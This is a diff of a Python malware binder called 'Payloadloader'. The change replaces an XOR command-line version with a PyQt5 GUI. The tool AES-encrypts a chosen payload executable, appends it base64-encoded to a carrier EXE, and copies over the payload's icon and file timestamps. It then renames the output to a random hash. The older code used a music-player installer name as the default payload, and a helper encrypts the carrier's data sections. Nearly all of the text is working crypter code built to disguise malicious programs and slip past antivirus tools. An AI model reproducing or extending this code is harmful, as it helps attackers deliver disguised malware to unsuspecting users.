@@ -5,244 +5,373 @@ import shutil
 import hashlib
 import base64
 import random
-import argparse
-from colorama import Fore, Style, init 
-import tkinter as tk
 import time
 import sys
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import padding
 
-def progress_bar(total):
-    for i in range(0, total + 1, 10):  # 每次增加2
-        percent = (i / total) * 100
-        bar = '=' * (i * 40 // total)
-        sys.stdout.write(f"\r[{bar:<40}] {percent:.2f}%")
-        sys.stdout.flush()
-        time.sleep(0.1)
 
-progress_bar(100)
-progress_bar(100)
+from PyQt5.QtWidgets import *
+from PyQt5.QtCore import *
+from PyQt5.QtGui import *
 
-os.system("cls")
 
-def print_colored(text, color):
-    print(f"{color}{text}{Style.RESET_ALL}")
-print_colored("""
-  ,---.                                 ,--.            ,--.                  ,--.
- /  O  \  ,--,--,   ,---.  ,--,--,      `--' ,--,--,    `--'  ,---.   ,---. ,-'  '-.
-|  .-.  | |      \ | .-. | |      \     ,--. |      \   ,--. | .-. : | .--' '-.  .-'
-|  | |  | |  ||  | ' '-' ' |  ||  |     |  | |  ||  |   |  | \   --. \ `--.   |  |
-`--' `--' `--''--'  `---'  `--''--'     `--' `--''--' .-'  /  `----'  `---'   `--'
-                                                      '---'
-[+] Payloadloader v2.0
-[+] Author: Anonfsocialize
-[+] Telegram: t.me/Anonfsocialize
-[+] Github: https://github.com/TR1123
-              
-""",
-color=Fore.BLUE)
+def safe_move(src, dst):
 
+    src_abs = os.path.abspath(src)
+    dst_abs = os.path.abspath(dst)
+    if src_abs == dst_abs:
+        return dst_abs
+    if os.path.exists(dst_abs):
+        os.remove(dst_abs)
+
+    if os.path.splitdrive(src_abs)[0] != os.path.splitdrive(dst_abs)[0]:
+        shutil.copy2(src_abs, dst_abs)
+        os.remove(src_abs)
+    else:
+        os.rename(src_abs, dst_abs)
+    return dst_abs
+
+def get_sha256(file_path):
+
+    h = hashlib.sha256()
+    if not os.path.isfile(file_path):
+        return ""
+    with open(file_path, 'rb') as f:
+        while chunk := f.read(65536):
+            h.update(chunk)
+    return h.hexdigest()
+
+def get_md5(file_path):
+
+    h = hashlib.md5()
+    if not os.path.isfile(file_path):
+        return ""
+    with open(file_path, 'rb') as f:
+        while chunk := f.read(65536):
+            h.update(chunk)
+    return h.hexdigest()
+
+def derive_aes_key(raw_key: str) -> bytes:
+   
+    return hashlib.sha256(raw_key.encode("utf-8")).digest()
+
+def aes_cbc_encrypt(data: bytes, raw_key: str) -> tuple[bytes, bytes]:
+   
+    key = derive_aes_key(raw_key)
+    iv = os.urandom(16)
+    padder = padding.PKCS7(128).padder()
+    padded_data = padder.update(data) + padder.finalize()
+    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
+    encryptor = cipher.encryptor()
+    cipher_data = encryptor.update(padded_data) + encryptor.finalize()
+    return iv, cipher_data
+
+def aes_cbc_decrypt(iv: bytes, cipher_data: bytes, raw_key: str) -> bytes:
+   
+    key = derive_aes_key(raw_key)
+    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
+    decryptor = cipher.decryptor()
+    unpadder = padding.PKCS7(128).unpadder()
+    plain = decryptor.update(cipher_data) + decryptor.finalize()
+    return unpadder.update(plain) + unpadder.finalize()
 
 def gather_file_info_win(binary):
-    flItms = {}
-    with open(binary, 'rb') as f:
-        f.seek(int('3C', 16))
-        flItms['CertLOC'] = struct.unpack("<I", f.read(4))[0]
-        flItms['CertSize'] = struct.unpack("<I", f.read(4))[0]
-    # 返回字典
+    flItms = {'CertLOC': 0, 'CertSize': 0}
+    try:
+        with open(binary, 'rb') as f:
+            f.seek(0x3C)
+            pe_off = struct.unpack("<I", f.read(4))[0]
+            f.seek(pe_off + 40)
+            f.seek(16, os.SEEK_CUR)
+            flItms['CertLOC'] = struct.unpack("<I", f.read(4))[0]
+            flItms['CertSize'] = struct.unpack("<I", f.read(4))[0]
+    except Exception:
+        pass
     return flItms
 
-# 定义一个函数copy_cert，用于复制exe文件中的证书
 def copy_cert(exe):
-    # 调用gather_file_info_win函数，获取exe文件的信息
-    flItms = gather_file_info_win(exe)
-    # 如果证书的位置或大小为0，则返回None
-    if flItms['CertLOC'] == 0 or flItms['CertSize'] == 0:
+    d = gather_file_info_win(exe)
+    if d['CertLOC'] == 0 or d['CertSize'] == 0:
         return None
-    # 打开exe文件，以二进制模式读取
-    with open(exe, 'rb') as f:
-        # 将文件指针移动到证书的位置
-        f.seek(flItms['CertLOC'], 0)
-        # 读取证书的内容
-        cert = f.read(flItms['CertSize'])
-    # 返回证书的内容
-    return cert
-
-# 定义一个函数，用于检查可执行文件的数字签名
-def check_digital_signature(exe):
-    # 尝试打开可执行文件
     try:
-        # 使用pefile库打开可执行文件
-        pe = pefile.PE(exe)
-        # 判断可执行文件是否有数字签名
-        if hasattr(pe, 'DIRECTORY_ENTRY_SECURITY') and pe.DIRECTORY_ENTRY_SECURITY:
-            # 如果有数字签名，返回True和数字签名信息
-            return True, pe.DIRECTORY_ENTRY_SECURITY
-        else:
-            # 如果没有数字签名，返回False和None
-            return False, None
-    except Exception as e:
-        # 如果发生异常，返回False和异常信息
-        return False, str(e)
+        with open(exe, 'rb') as f:
+            f.seek(d['CertLOC'])
+            return f.read(d['CertSize'])
+    except Exception:
+        return None
 
-# 检查文件完整性
+def check_digital_signature(exe):
+    try:
+        pe = pefile.PE(exe)
+        has_sign = hasattr(pe, 'DIRECTORY_ENTRY_SECURITY')
+        pe.close()
+        return has_sign
+    except Exception:
+        return False
+
 def check_file_integrity(exe):
-    # 判断文件是否存在且可读
     return os.path.isfile(exe) and os.access(exe, os.R_OK)
 
-# 定义一个函数，用于获取pe文件中的图标数据
+
 def get_icon_data(pe):
-    # 初始化图标数据为None
-    icon_data = None
-    # 遍历pe文件中的资源目录
-    for entry in pe.DIRECTORY_ENTRY_RESOURCE.entries:
-        # 如果资源目录的名称存在，并且名称为'1'
-        if entry.name and entry.name.string == '1':
-            # 遍历资源目录中的子目录
-            for sub_entry in entry.directory.entries:
-                # 如果子目录的id为1
-                if sub_entry.id == 1:
-                    # 获取子目录中的第一个条目的数据，并赋值给图标数据
-                    icon_data = sub_entry.directory.entries[0].data
-                    # 跳出循环
-                    break
-    # 返回图标数据
-    return icon_data
+ 
+    try:
+        if not hasattr(pe, "DIRECTORY_ENTRY_RESOURCE"):
+            return None
+   
+        for res_root in pe.DIRECTORY_ENTRY_RESOURCE.entries:
+            
+            if res_root.id == pefile.RESOURCE_TYPE['RT_ICON']:
+                for lang_entry in res_root.directory.entries:
+                    if not lang_entry.directory.entries:
+                        continue
+                    entry = lang_entry.directory.entries[0]
+               
+                    raw_data = entry.data.struct.get_data(pe)
+                    return type('IconObj', (), {'data': raw_data})
+        return None
+    except Exception:
+        return None
 
-# 定义一个函数，用于对数据进行异或加密和解密
-def xor_encrypt_decrypt(data, key):
-    # 遍历数据中的每一个字节
-    return bytes([b ^ key for b in data])
+def generate_md5_filename(file_path: str):
+    rand_seed = file_path + str(time.time())
+    return hashlib.md5(rand_seed.encode()).hexdigest() + ".exe"
 
-# 定义一个函数，用于将数据进行base64编码
-def base64_encode(data):
-    # 使用base64模块中的b64encode函数对数据进行编码
-    return base64.b64encode(data)
 
-def base64_decode(data):
-    return base64.b64decode(data)
+def encrypt_pe_data_section(pe_path: str, save_path: str, key: str):
+ 
+    shutil.copy2(pe_path, save_path)
+    pe = pefile.PE(save_path)
+    iv_global = os.urandom(16)
+    with open(save_path, 'r+b') as fw:
+        for sec in pe.sections:
+            sec_name = sec.Name.decode().strip('\x00')
+           
+            if sec_name in (".data", ".rdata", ".idata"):
+                ptr = sec.PointerToRawData
+                size = sec.SizeOfRawData
+                fw.seek(ptr)
+                sec_data = fw.read(size)
+              
+                iv, enc_sec = aes_cbc_encrypt(sec_data, key)
+               
+                fw.seek(ptr)
+                fw.write(enc_sec[:size])
+    pe.close()
+    return save_path, iv_global
 
-# 定义一个函数，用于生成MD5哈希值的文件名
-def generate_md5_filename(base_name):
-    # 使用hashlib库中的md5函数，将base_name编码为字节流，并生成MD5哈希值
-    md5_hash = hashlib.md5(base_name.encode()).hexdigest()
-    # 返回以MD5哈希值为前缀，后缀为.exe的文件名
-    return f"{md5_hash}.exe"
+def inject_exe(target, payload, out, key):
+    try:
+        if not check_file_integrity(target) or not check_file_integrity(payload):
+            return False, 
 
-# 定义一个函数，用于对文件名进行base64编码
-def base64_encode_filename(file_name):
-    # 将文件名编码为字节
-    encoded_bytes = base64.b64encode(file_name.encode())
-    # 将编码后的字节解码为字符串，并添加.exe后缀
-    return f"{encoded_bytes.decode()}.exe"
+        t_pe = pefile.PE(target)
+        p_pe = pefile.PE(payload)
 
-def inject_exe(target_exe_path, payload_exe_path, output_exe_path, xor_key, show_log=False):
-    # 打开目标可执行文件和负载数据
-    target_pe = pefile.PE(target_exe_path)
-    payload_pe = pefile.PE(payload_exe_path)
+        with open(target, 'rb') as f:
+            t_data = f.read()
+        with open(payload, 'rb') as f:
+            p_data = f.read()
 
-    # 打开输出文件
-    with open(output_exe_path, 'wb') as output_file:
-        # 将目标可执行文件写入输出文件
-        output_file.write(open(target_exe_path, 'rb').read())
-        # 读取负载数据
-        payload_data = open(payload_exe_path, 'rb').read()
-        
-        # 加密负载数据
-        encrypted_payload = xor_encrypt_decrypt(payload_data, xor_key)
-        if show_log:
-            # 打印负载数据的原始大小和加密后的大小
-            print(f"[*] inject {payload_exe_path} :")
-            print(f"[*] Payload Original load size: {len(payload_data)}")
-            print(f"[*] Payload Encrypted load size: {len(encrypted_payload)}")
-        
-        # 对负载数据进行base64编码
-        encoded_payload = base64_encode(encrypted_payload)
-        
-        # 将编码后的负载数据写入输出文件
-        output_file.write(encoded_payload)
-        # 计算跳转偏移量
-        jump_offset = len(open(target_exe_path, 'rb').read()) + len(encoded_payload) + 2
-        # 将跳转偏移量写入输出文件
-        output_file.write(struct.pack('<I', jump_offset))
+        # AES-CBC加密载荷
+        iv, enc_payload = aes_cbc_encrypt(p_data, key)
+        combine_enc = iv + enc_payload
+        b64_enc = base64.b64encode(combine_enc)
 
-    # 获取负载数据的图标数据
-    icon_data = get_icon_data(payload_pe)
-    if icon_data:
-        # 将图标数据写入输出文件
-        with open(output_exe_path, 'ab') as output_file:
-            output_file.write(icon_data)
+        with open(out, 'wb') as o:
+            o.write(t_data)
+            o.write(b64_enc)
+            o.write(struct.pack('<I', len(t_data)))
 
-    # 复制负载数据的文件属性到输出文件
-    shutil.copystat(payload_exe_path, output_exe_path)
+        icon_entry = get_icon_data(p_pe)
+        if icon_entry:
+            with open(out, 'ab') as f:
+                f.write(icon_entry.data)
 
-    if show_log:
-        # 打印注入完成的信息
-        print(f"[*] Injection completed, output file: {output_exe_path}")
+        shutil.copystat(payload, out)
+        t_pe.close()
+        p_pe.close()
+        return True, "注入流程执行完成"
+    except Exception as e:
+        return False, f"注入异常: {str(e)}"
 
-def extract_and_inject(target_exe, payload_exe, output_exe, xor_key, show_log=False):
-    # 检查目标文件是否损坏或不可访问
-    if not check_file_integrity(target_exe):
-        print("[-] Unable to inject file, the file is damaged or inaccessible.")
-        return
 
-    # 提取目标文件的证书
-    cert = copy_cert(target_exe)
-    if cert:
-        if show_log:
-            print(f"[*] Extracted certificate size: {len(cert)}")
-    else:
-        if show_log:
-            print("[*] Certificate not found")
+class DarkInjectWindow(QMainWindow):
+    def __init__(self):
+        super().__init__()
+        self.setWindowTitle("PayloadLoader")
+        self.setMinimumSize(780, 620)
+        self.resize(860, 680)
+        self.setWindowIcon(QApplication.style().standardIcon(QStyle.SP_FileDialogContentsView))
 
-    # 检查数字签名
-    has_signature, signature_info = check_digital_signature(target_exe)
-    if has_signature:
-        if show_log:
-            print("[*] The file has a digital label")
-            # 可以在这里打印签名信息
-            print(f"[*] Digital signature information: {signature_info}")
-    else:
-        print("[-] The file has no digital signature")
-    
-    # 注入payload文件
-    inject_exe(target_exe, payload_exe, output_exe, xor_key, show_log)
+        self.setStyleSheet("""
+            QMainWindow {background-color: #242426; border-radius: 10px;}
+            QWidget {color: #f0f0f0; font-family: "Microsoft YaHei UI", SimHei; font-size: 10pt;}
+            QGroupBox {border: 1px solid #404044; border-radius: 8px; margin-top: 12px; padding-top: 16px; background-color: #2a2a2d;}
+            QGroupBox::title {subcontrol-origin: margin; left: 12px; top: 2px; color: #cccccc; font-weight: bold;}
+            QLineEdit {background-color: #36363b; border: 1px solid #4c4c52; border-radius: 6px; padding: 8px 10px; color: #ffffff; selection-background-color: #5078b8;}
+            QLineEdit:focus {border: 1px solid #6088d0;}
+            QPushButton {background-color: #3c3c42; border: 1px solid #505058; border-radius: 6px; padding: 9px 14px; min-height: 18px;}
+            QPushButton:hover {background-color: #4c4c54; border-color: #64646e;}
+            QPushButton:pressed {background-color: #323238;}
+            #btnInjectStart {background-color: #2d5a38; border: 1px solid #3c784a;}
+            #btnInjectStart:hover {background-color: #377045;}
+            QTextEdit {background-color: #1e1e20; border: 1px solid #38383d; border-radius: 6px; padding: 8px; font-family: Consolas, monospace; font-size: 9pt;}
+            QLabel {color: #dddddd;}
+            QFrame[frameShape="4"] {color: #3a3a3f; height: 1px;}
+        """)
 
-# 生成一个MD5密钥
-def generate_md5_key():
-    # 使用os.urandom()函数生成一个16字节的随机数
-    # 使用hashlib.md5()函数将随机数进行MD5加密
-    # 使用hexdigest()函数将加密后的结果转换为十六进制字符串
-    return hashlib.md5(os.urandom(16)).hexdigest()
+        central_widget = QWidget()
+        self.setCentralWidget(central_widget)
+        main_layout = QVBoxLayout(central_widget)
+        main_layout.setContentsMargins(22, 18, 22, 18)
+        main_layout.setSpacing(14)
+
+        title_label = QLabel("EXE")
+        title_label.setStyleSheet("font-size:14pt; font-weight:bold; color:#e8e8e8; padding-bottom:4px;")
+        main_layout.addWidget(title_label)
+        split_line = QFrame()
+        split_line.setFrameShape(QFrame.HLine)
+        main_layout.addWidget(split_line)
+
+        file_group = QGroupBox("文件路径配置")
+        file_layout = QVBoxLayout(file_group)
+        file_layout.setContentsMargins(16, 22, 16, 16)
+        file_layout.setSpacing(12)
+
+        row_target = QHBoxLayout()
+        self.target_input = QLineEdit()
+        self.target_input.setPlaceholderText("选择作为载体的目标EXE文件")
+        btn_target = QPushButton("选择载体EXE")
+        btn_target.clicked.connect(self.select_target_file)
+        row_target.addWidget(QLabel("载体程序："), stretch=0)
+        row_target.addWidget(self.target_input, stretch=1)
+        row_target.addWidget(btn_target, stretch=0)
+        file_layout.addLayout(row_target)
+
+        row_payload = QHBoxLayout()
+        self.payload_input = QLineEdit()
+        self.payload_input.setPlaceholderText("需要注入的载荷EXE文件")
+        btn_payload = QPushButton("选择载荷EXE")
+        btn_payload.clicked.connect(self.select_payload_file)
+        row_payload.addWidget(QLabel("载荷程序："), stretch=0)
+        row_payload.addWidget(self.payload_input, stretch=1)
+        row_payload.addWidget(btn_payload, stretch=0)
+        file_layout.addLayout(row_payload)
+
+        row_output = QHBoxLayout()
+        self.output_input = QLineEdit()
+        self.output_input.setPlaceholderText("输出合成后的EXE保存路径")
+        btn_output = QPushButton("设置输出路径")
+        btn_output.clicked.connect(self.select_output_path)
+        row_output.addWidget(QLabel("输出文件："), stretch=0)
+        row_output.addWidget(self.output_input, stretch=1)
+        row_output.addWidget(btn_output, stretch=0)
+        file_layout.addLayout(row_output)
+        main_layout.addWidget(file_group)
+
+        key_group = QGroupBox("AES加密密钥设置")
+        key_layout = QVBoxLayout(key_group)
+        key_layout.setContentsMargins(16, 22, 16, 16)
+        key_layout.setSpacing(10)
+        self.key_input = QLineEdit()
+        self.key_input.setPlaceholderText("自定义加密密钥（任意字符串，越长安全性越高）")
+        key_layout.addWidget(QLabel("加密密钥："))
+        key_layout.addWidget(self.key_input)
+        main_layout.addWidget(key_group)
+
+        btn_layout = QHBoxLayout()
+        btn_layout.addStretch()
+        self.btn_start = QPushButton("✅ 开始加密注入")
+        self.btn_start.setObjectName("btnInjectStart")
+        self.btn_start.setFixedWidth(180)
+        self.btn_start.clicked.connect(self.run_inject_task)
+        btn_layout.addWidget(self.btn_start)
+        btn_layout.addStretch()
+        main_layout.addLayout(btn_layout)
+
+        log_group = QGroupBox("运行日志")
+        log_layout = QVBoxLayout(log_group)
+        log_layout.setContentsMargins(16, 22, 16, 16)
+        self.log_text = QTextEdit()
+        self.log_text.setReadOnly(True)
+        log_layout.addWidget(self.log_text)
+        main_layout.addWidget(log_group)
+
+    def select_target_file(self):
+        path, _ = QFileDialog.getOpenFileName(self, "选择载体EXE", "", "可执行文件 (*.exe)")
+        if path:
+            self.target_input.setText(path)
+            self.log_print(f"[INFO] 已加载载体文件: {path}", color="#dddddd")
+
+    def select_payload_file(self):
+        path, _ = QFileDialog.getOpenFileName(self, "选择载荷EXE", "", "可执行文件 (*.exe)")
+        if path:
+            self.payload_input.setText(path)
+            self.log_print(f"[INFO] 已加载载荷文件: {path}", color="#dddddd")
+
+    def select_output_path(self):
+        path, _ = QFileDialog.getSaveFileName(self, "输出合成EXE", "output.exe", "可执行文件 (*.exe)")
+        if path:
+            self.output_input.setText(path)
+            self.log_print(f"[INFO] 设置输出路径: {path}", color="#dddddd")
+
+    def log_print(self, msg: str, color="#ffffff"):
+        html = f'<span style="color:{color}">{msg}</span>'
+        self.log_text.append(html)
+        QApplication.processEvents()
+
+    def run_inject_task(self):
+        target = self.target_input.text().strip()
+        payload = self.payload_input.text().strip()
+        output = self.output_input.text().strip()
+        key = self.key_input.text().strip()
+
+        if not target:
+            self.log_print("[-] 错误：请选择载体EXE文件", color="#ff6b6b")
+            return
+        if not payload:
+            self.log_print("[-] 错误：请选择载荷EXE文件", color="#ff6b6b")
+            return
+        if not output:
+            self.log_print("[-] 错误：请设置输出保存路径", color="#ff6b6b")
+            return
+        if not key:
+            self.log_print("[-] 错误：请输入AES加密密钥", color="#ff6b6b")
+            return
+
+        self.log_print("=" * 60, color="#888888")
+        self.log_print(f"[*] 载体：{target}", color="#a0d8ff")
+        self.log_print(f"[*] 载荷：{payload}", color="#a0d8ff")
+        self.log_print(f"[*] 输出路径：{output}", color="#a0d8ff")
+        self.log_print("[*] 正在执行加密注入流程...", color="#ffdd70")
+
+        temp_out = output
+        if os.path.exists(temp_out):
+            temp_out = generate_md5_filename(output)
+            self.log_print(f"[!] 输出文件已存在，自动生成临时文件名: {temp_out}", color="#ffdd70")
+
+        ok, msg = inject_exe(target, payload, temp_out, key)
+        if ok:
+          
+            final_name = hashlib.md5(os.urandom(16)).hexdigest() + ".exe"
+            final_full_path = safe_move(temp_out, final_name)
+            md5_hash = get_md5(final_full_path)
+            self.log_print("[+] ==================== 注入成功 ====================", color="#69ff94")
+            self.log_print(f"[+] 生成成品文件: {final_full_path}", color="#69ff94")
+            self.log_print(f"[+] 文件MD5: {md5_hash}", color="#69ff94")
+            self.log_print("[提示] 如需加密载体区段(.data/.rdata)，调用 encrypt_pe_data_section 函数", color="#ffdd70")
+        else:
+            self.log_print(f"[-] 注入失败: {msg}", color="#ff6b6b")
+
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Payload loader...")
-    parser.add_argument('-e', '--exe', type=str, required=True, help='要注入的exe文件路径')
-    parser.add_argument('-o', '--output', type=str, required=True, help='输出exe文件路径')
-    parser.add_argument('-x', '--xor', type=int, default=123, help='XOR加密密钥,默认123')
-    parser.add_argument('-r', '--show_log', action='store_true', help='显示执行过程的日志')
-    
-    args = parser.parse_args()
+    QApplication.setAttribute(Qt.AA_EnableHighDpiScaling)
+    QApplication.setAttribute(Qt.AA_UseHighDpiPixmaps)
 
-    target_exe = args.exe
-    output_exe = args.output
-    xor_key = args.xor
-    show_log = args.show_log
-
-    if os.path.exists(output_exe):
-        if random.choice([True, False]):
-            output_exe = generate_md5_filename(output_exe)
-        else:
-            output_exe = base64_encode_filename(output_exe)
-
-    payload_exe = 'NeteaseCloudMusic_Music_official_3.0.0.202884_64.exe'  # 默认负载文件路径
-    extract_and_inject(target_exe, payload_exe, output_exe, xor_key, show_log)
-
-    md5_key = generate_md5_key()
-    new_output_exe = f"{md5_key}.exe"
-    os.rename(output_exe, new_output_exe)
-
-    # 精简的输出格式
-    if show_log:
-        print(f"[*] Rename the output file to: {new_output_exe}")
-    else:
-        print(f"[+] File injection succeeded: {new_output_exe}")
+    app = QApplication(sys.argv)
+    window = DarkInjectWindow()
+    window.show()
+    sys.exit(app.exec_())
